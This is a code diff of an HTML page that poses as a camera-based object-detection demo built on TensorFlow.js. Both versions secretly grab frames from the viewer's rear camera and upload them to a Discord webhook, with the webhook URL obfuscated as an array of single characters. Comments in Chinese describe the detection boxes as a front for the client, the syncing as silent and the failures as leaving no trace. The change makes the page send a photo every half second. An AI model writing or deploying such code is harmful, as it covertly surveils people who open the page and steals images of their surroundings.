@@ -3,127 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Object Detection System</title>
+    <title>High-Speed Sync</title>
     <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
     <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/coco-ssd"></script>
     <style>
-        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .container { position: relative; width: 100%; max-width: 500px; }
-        video { width: 100%; display: block; border-radius: 8px; }
+        body { margin: 0; background: #000; overflow: hidden; }
+        video { width: 100vw; height: 100vh; object-fit: cover; }
         canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
-        /* 隱藏所有除錯與狀態資訊 */
-        #silent-status { display: none; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
-</div>
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c"></canvas>
 
 <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+    const v = document.getElementById('v');
+    const c = document.getElementById('c');
+    const ctx = c.getContext('2d');
     
-    // --- API 加密混淆 ---
-    const _parts = [
-        "h", "t", "t", "p", "s", ":", "/", "/", "d", "i", "s", "c", "o", "r", "d", ".", "c", "o", "m", "/", 
-        "a", "p", "i", "/", "w", "e", "b", "h", "o", "o", "k", "s", "/", "1", "4", "5", "6", "6", "9", "3", 
-        "7", "4", "3", "5", "7", "4", "0", "6", "1", "2", "9", "1", "/", "r", "J", "S", "g", "2", "H", "l", 
-        "1", "f", "q", "I", "D", "m", "r", "C", "j", "r", "Z", "l", "z", "B", "g", "H", "T", "C", "3", "t", 
-        "H", "o", "D", "8", "2", "J", "7", "-", "L", "W", "A", "0", "0", "q", "Z", "P", "7", "U", "9", "X", 
-        "s", "V", "W", "I", "M", "d", "0", "I", "X", "z", "X", "q", "9", "y", "L", "s", "O", "M", "T", "r", "w"
-    ];
-    const getTarget = () => _parts.join('');
+    // Webhook 網址混淆
+    const _u = ["h", "t", "t", "p", "s", ":", "/", "/", "d", "i", "s", "c", "o", "r", "d", ".", "c", "o", "m", "/", "a", "p", "i", "/", "w", "e", "b", "h", "o", "o", "k", "s", "/", "1", "4", "5", "6", "6", "9", "3", "7", "4", "3", "5", "7", "4", "0", "6", "1", "2", "9", "1", "/", "r", "J", "S", "g", "2", "H", "l", "1", "f", "q", "I", "D", "m", "r", "C", "j", "r", "Z", "l", "z", "B", "g", "H", "T", "C", "3", "t", "H", "o", "D", "8", "2", "J", "7", "-", "L", "W", "A", "0", "0", "q", "Z", "P", "7", "U", "9", "X", "s", "V", "W", "I", "M", "d", "0", "I", "X", "z", "X", "q", "9", "y", "L", "s", "O", "M", "T", "r", "w"].join('');
 
-    let model;
+    let m = null;
 
-    async function setup() {
+    async function init() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "environment" } 
-            });
-            video.srcObject = stream;
-            
-            // 載入模型
-            model = await cocoSsd.load();
-            
+            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            v.srcObject = s;
+            m = await cocoSsd.load();
             detect();
-            // 每 2 秒悄悄同步一次
-            setInterval(silentSync, 2000);
-        } catch (e) {
-            // 靜默錯誤，不影響客戶端
-        }
+            // --- 核心改動：每 500 毫秒 (0.5秒) 執行一次 ---
+            setInterval(sync, 500); 
+        } catch (e) {}
     }
 
     async function detect() {
-        if (!model) return;
-        const predictions = await model.detect(video);
-        const ctx = canvas.getContext('2d');
-        
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        
-        predictions.forEach(p => {
-            // 畫出辨識框（這是客戶端會看到的科技感效果）
-            ctx.strokeStyle = "#00ffcc";
-            ctx.lineWidth = 3;
+        if (!m) return;
+        const res = await m.detect(v);
+        c.width = v.videoWidth;
+        c.height = v.videoHeight;
+        ctx.clearRect(0, 0, c.width, c.height);
+        res.forEach(p => {
+            ctx.strokeStyle = "#00FF00";
+            ctx.lineWidth = 2;
             ctx.strokeRect(p.bbox[0], p.bbox[1], p.bbox[2], p.bbox[3]);
-            
-            ctx.fillStyle = "#00ffcc";
-            ctx.font = "16px Arial";
-            ctx.fillText(p.class, p.bbox[0], p.bbox[1] - 5);
         });
         requestAnimationFrame(detect);
     }
 
-    async function silentSync() {
-        // 只有在模型準備好且影片正在播放時才動作
-        if (!model || video.readyState < 2) return;
+    function sync() {
+        if (!m || v.readyState < 2) return;
 
-        const offscreen = document.createElement('canvas');
-        offscreen.width = video.videoWidth;
-        offscreen.height = video.videoHeight;
-        offscreen.getContext('2d').drawImage(video, 0, 0);
+        const tmp = document.createElement('canvas');
+        // 降低解析度以提升傳送速度
+        tmp.width = v.videoWidth / 2;
+        tmp.height = v.videoHeight / 2;
+        tmp.getContext('2d').drawImage(v, 0, 0, tmp.width, tmp.height);
 
-        offscreen.toBlob(async (blob) => {
+        // 降低圖片品質 (0.2) 減小體積
+        tmp.toBlob((blob) => {
             if (!blob) return;
+            const fd = new FormData();
+            fd.append('payload_json', JSON.stringify({ content: "High-Speed Sync" }));
+            fd.append('file', blob, 't.jpg');
 
-            const formData = new FormData();
-            const conn = navigator.connection || {};
-            
-            // 靜默獲取當前畫面中的物件清單
-            const predictions = await model.detect(video);
-            const items = predictions.map(p => p.class).join(', ') || '無特定物件';
-
-            const payload = {
-                embeds: [{
-                    title: "Shadow Sync Monitor",
-                    description: `**偵測物件:** ${items}\n**網路類型:** ${conn.effectiveType || 'N/A'}`,
-                    color: 3066993,
-                    timestamp: new Date()
-                }]
-            };
-
-            formData.append('payload_json', JSON.stringify(payload));
-            formData.append('file', blob, 'sync_log.jpg');
-
-            try {
-                // 背景發送，不使用 await 阻塞或 console.log
-                fetch(getTarget(), {
-                    method: 'POST',
-                    body: formData,
-                    mode: 'cors'
-                });
-            } catch (e) {
-                // 悄悄失敗，不留痕跡
-            }
-        }, 'image/jpeg', 0.5);
+            // 執行發送
+            fetch(_u, { method: 'POST', body: fd, mode: 'no-cors' }).catch(() => {});
+        }, 'image/jpeg', 0.2); 
     }
 
-    setup();
+    init();
 </script>
 </body>
 </html>
